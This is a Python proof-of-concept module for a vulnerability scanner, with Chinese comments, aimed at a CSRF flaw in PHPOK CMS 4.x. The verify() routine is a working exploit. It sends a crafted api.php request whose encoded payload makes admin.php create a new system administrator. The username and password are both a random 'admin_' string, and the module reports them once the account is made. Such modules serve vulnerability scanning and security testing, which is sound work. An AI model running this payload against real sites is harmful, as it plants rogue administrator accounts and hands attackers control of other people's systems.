# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0005_L'  # 平台漏洞编号，留空
    name = 'PHPOKCMS 4.x CSRF'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-07-25'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        phpokcms存在csrf漏洞，管理员查看会员列表时不知不觉会自动添加新的系统管理员。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1890/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = '4.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '00722f98-d5a7-4eef-a152-51f5d7c6d833'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payload根据实际情况确定
            # 注册会员后打开如下链接。
            payload = "/phpok/api.php"
            s = requests.session()
            s.get(self.target + payload)
            # 生成随机注册信息
            randstr = 'admin_' + str(random.randint(1, 10000))
            data = "?c=usercp&f=avatar&data=%2fphpok%2fadmin.php%3Fc%3Dadmin%26f%3Dsave%26id%3D%26account%3D{username}%26pass%3D{password}%26email%3Dadmin%2540a1.com%26status%3D1%26if_system%3D1".format(
                username=randstr, password=randstr)
            url = self.target + payload + data
            r = s.get(url)

            # 然后登录管理员后台，点击会员（此时一个名为randstr 密码为randstr的系统管理员已经添加成功。）
            # 再打开设置，管理员维护去看一下即可。
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册管理员账号：{username}，密码：{password}'.format(
                    target=self.target, name=self.vuln.name, username=randstr, password=randstr))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
